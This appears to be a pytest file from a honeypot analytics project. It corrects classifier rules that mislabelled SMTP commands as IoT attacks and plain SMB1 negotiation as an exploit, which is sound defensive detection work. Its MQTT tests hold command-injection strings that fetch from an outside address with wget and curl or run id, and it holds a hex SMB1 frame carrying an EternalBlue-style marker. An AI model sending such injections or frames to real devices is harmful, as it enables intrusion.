"""`QUIT` is not an IoT attack, and speaking SMB1 is not an exploit.

B5a, open item 5 of the 4 Oct-4 Nov fleet review. The review called both of these naming
problems. Measured against the live store, one of them is not.

**`IOT_ATTACK` on SMTP is a rule firing on our own event format.** 261,531 rows on sensor-a, 259,002
of them carrying that verdict and nothing else, and 237,286 produced by a single rule:
`mqtt_command_injection`, whose pattern is `\\{[^}]*("command"|"cmd"|…)[^}]*\\}` — a JSON object
with a `command` key. That is the shape every command-protocol decoy writes:
`{"phase": "command", "command": "...", "dst_port": 25}`. So the rule matched the serialisation,
not the traffic. What it labelled an IoT attack, by volume on port 25: `AUTH LOGIN` 63,730,
**`RSET` 61,604, `QUIT` 54,478**, `EHLO localhost` 53,628. It also fired on :21 (9,825), :6379
(9,075) and :11211 (5,238) — every decoy that logs a `command` field.

Two reasons it reached port 25 at all, and both are fixed here:

* The pattern claims command injection from the PRESENCE of a `command` key. An injection needs
  something executable in the VALUE.
* The MQTT port gate tests `atype == "MQTT_ATTACK"`, and this rule is typed `IOT_ATTACK`. The
  gate used to test `rname.startswith("mqtt_")` and was changed to the type after an
  AI-generated name slipped through — this is the mirror image, a `mqtt_`-named rule with
  another type slipping through the type test. The gate now tests the union of both, which is
  what the original note should have said.

`AUTH LOGIN` keeps a verdict, because removing a wrong label must not leave a blind spot: it is
the SMTP command that announces a credential exchange, so it is an `SMTP_PROBE` like `EHLO`
already is, and the decoy's own `CREDENTIAL_CAPTURE` still records the credentials when they
arrive. `QUIT` and `RSET` get nothing, which is correct — they are protocol punctuation.

**`SMB_EXPLOIT_PROBE` and `SMB_SCAN` on the same rows is the decoy's verdict.** The review found
342,158 rows carrying both; the measurement names the writer. `hp_smb` logs
`attack_type="SMB_EXPLOIT_PROBE"`, severity HIGH, rule `smb1_detected`, for **any** frame whose
first four bytes are the SMB1 magic — 334,700 rows on sensor-a — while the registry's negotiation
rules correctly call the same frame `SMB_SCAN`. The same rule name also exists in
`binary_detectors` with the type `SMB`, so one name meant three things.

The plan's default decides it: the exploit verdict requires the exploit's own bytes. An SMB1
frame is legacy-dialect negotiation — the baseline the internet applies to any exposed :445 — and
it becomes `SMB_EXPLOIT_PROBE` only when the frame carries a trans2 or NT-trans command together
with the `1807c0` marker our own registry rules key on.

⚠️ Stored rows are not corrected by this change. A decoy-authored `attack_patterns` row is
preserved by `delete_patterns_for_events`, not regenerated, so the 334,700 existing
`SMB_EXPLOIT_PROBE` rows need a targeted update — recorded as a Phase Z step.
"""

from __future__ import annotations

import pytest

from honeylens.classification.attack_classifier import classify_event_row
from honeylens.classification.scoring import get_severity


def _smtp(command: str):
    """What the SMTP decoy writes: its own JSON event as the payload."""
    payload = f'{{"phase": "command", "command": "{command}", "dst_port": 25}}'
    return classify_event_row(payload, "smtp", {"dst_port": 25, "command": command})


def _types(hits) -> set[str]:
    return {h[0] for h in hits}


def _rules(hits) -> set[str]:
    return {h[1] for h in hits}


# ---------------------------------------------------------------------------
# Our own event format is not an attack
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("command", "rows"),
    [("QUIT", 54478), ("RSET", 61604), ("EHLO localhost", 53628), ("AUTH LOGIN", 63730)],
)
def test_an_smtp_command_is_not_an_iot_attack(command, rows):
    """The row counts are what this cost on one sensor."""
    assert "IOT_ATTACK" not in _types(_smtp(command)), f"{rows} rows on sensor-a"


def test_protocol_punctuation_gets_no_verdict_at_all():
    """`QUIT` and `RSET` say nothing about intent. 116,082 rows between them."""
    assert _smtp("QUIT") == []
    assert _smtp("RSET") == []


def test_the_auth_command_keeps_a_verdict():
    """Removing a wrong label must not leave a blind spot: 63,730 rows said `AUTH LOGIN` and
    carried no other verdict. It is the command that announces a credential exchange."""
    hits = _smtp("AUTH LOGIN")

    assert "SMTP_PROBE" in _types(hits)
    assert "smtp_auth_offer" in _rules(hits)


def test_the_auth_offer_is_informational():
    """One `AUTH LOGIN` is a protocol step, not a brute-force run. The credentials themselves
    are what the decoy's own CREDENTIAL_CAPTURE records, 128,525 times on :25."""
    assert get_severity("SMTP_PROBE", "smtp_auth_offer") == "info"


def test_the_greeting_keeps_its_existing_verdict():
    """`smtp_ehlo` already named this correctly; nothing about it changes."""
    assert "smtp_ehlo" in _rules(_smtp("EHLO localhost"))


@pytest.mark.parametrize("port", [21, 6379, 11211, 23])
def test_the_other_command_decoys_are_clean_too(port):
    """:21 9,825 rows, :6379 9,075, :11211 5,238, :23 25 — every decoy that logs a `command`
    field was labelled an IoT attack by its own serialisation."""
    payload = f'{{"phase": "command", "command": "LIST", "dst_port": {port}}}'
    hits = classify_event_row(payload, "tcp", {"dst_port": port, "command": "LIST"})

    assert "IOT_ATTACK" not in _types(hits)


# ---------------------------------------------------------------------------
# What the MQTT rule should actually catch
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "value",
    ["reboot; wget http://198.51.100.7/x", "$(id)", "x && curl http://198.51.100.7", "`id`"],
)
def test_a_real_command_injection_on_an_mqtt_port_still_fires(value):
    """The rule keeps its job: a command value carrying something executable, on MQTT."""
    payload = f'{{"command": "{value}"}}'
    hits = classify_event_row(payload, "mqtt", {"dst_port": 1883})

    assert "mqtt_command_injection" in _rules(hits)


def test_a_harmless_command_value_is_not_an_injection():
    """An MQTT payload really can carry `{"command": "ON"}` — that is what MQTT is for."""
    hits = classify_event_row('{"command": "ON"}', "mqtt", {"dst_port": 1883})

    assert "mqtt_command_injection" not in _rules(hits)


def test_an_injection_off_an_mqtt_port_is_not_called_mqtt():
    """The gate, now tested as the union of name and type. The same bytes on :25 are not an
    MQTT attack, whatever else they are."""
    payload = '{"command": "reboot; wget http://198.51.100.7/x"}'
    hits = classify_event_row(payload, "smtp", {"dst_port": 25})

    assert "mqtt_command_injection" not in _rules(hits)
    assert "IOT_ATTACK" not in _types(hits)


def test_the_mqtt_rules_typed_mqtt_attack_are_still_gated():
    """The original gate must keep working — this is a union, not a replacement."""
    hits = classify_event_row("\x10\x10MQTT", "smtp", {"dst_port": 25})

    assert "MQTT_ATTACK" not in _types(hits)


# ---------------------------------------------------------------------------
# Speaking SMB1 is negotiation, not exploitation
# ---------------------------------------------------------------------------

# An SMB1 NEGOTIATE PROTOCOL request: magic, command 0x72, no exploit marker.
SMB1_NEGOTIATE = "ff534d4272000000001801480000000000000000000000000000ffff6c1b0000"
# A trans2 request carrying the flags2 bytes our own registry rules key on for EternalBlue.
SMB1_TRANS2_EXPLOIT = "ff534d42320000000018" + "07c0" + "00000000000000000000ffff" + "0e00"


def _smb_decoy(hexframe: str):
    """`hp_smb`'s verdict for one SMB1 frame."""
    from honeylens.honeypots.hp_smb import smb1_verdict

    return smb1_verdict(bytes.fromhex(hexframe))


def test_a_bare_smb1_negotiation_is_a_scan():
    """334,700 rows on sensor-a carried `SMB_EXPLOIT_PROBE` at HIGH for exactly this frame, while
    the registry's own negotiation rules called the same bytes `SMB_SCAN`."""
    attack_type, severity, _rule = _smb_decoy(SMB1_NEGOTIATE)

    assert attack_type == "SMB_SCAN"
    assert severity == "MEDIUM"


def test_the_exploit_verdict_requires_the_exploit_s_own_bytes():
    """The plan's default, and the registry already agrees: `1807c0` plus a trans2 or NT-trans
    command is what the EternalBlue rules key on."""
    attack_type, severity, rule = _smb_decoy(SMB1_TRANS2_EXPLOIT)

    assert attack_type == "SMB_EXPLOIT_PROBE"
    assert severity == "HIGH"
    assert rule == "smb1_trans2_exploit_marker"


def test_a_trans2_command_without_the_marker_is_not_the_exploit():
    """Trans2 is an ordinary SMB1 command. Claiming EternalBlue from its presence is how
    342,158 rows came to carry two contradictory verdicts."""
    trans2_plain = "ff534d4232000000000000000000000000000000000000ffff6c1b0000"
    attack_type, _severity, _rule = _smb_decoy(trans2_plain)

    assert attack_type == "SMB_SCAN"


def test_the_central_detector_agrees_with_the_decoy():
    """One rule name meant three things: `SMB_EXPLOIT_PROBE` from the decoy, `SMB` from
    `binary_detectors`, and `SMB_SCAN` from the registry — for the same frame."""
    hits = classify_event_row(SMB1_NEGOTIATE, "smb", {"dst_port": 445, "hex": SMB1_NEGOTIATE})
    for atype, rname, _snippet in hits:
        if rname == "smb1_detected":
            assert atype == "SMB_SCAN"
            break
    else:
        raise AssertionError(f"smb1_detected did not fire: {hits}")


def test_the_two_smb_verdicts_are_scored_apart():
    """They were both falling through to the table's `medium` default, so a scan and an exploit
    probe scored the same — the distinction the names promise was not in the data."""
    assert get_severity("SMB_SCAN", "smb1_detected") == "low"
    assert get_severity("SMB_EXPLOIT_PROBE", "smb1_trans2_exploit_marker") == "high"
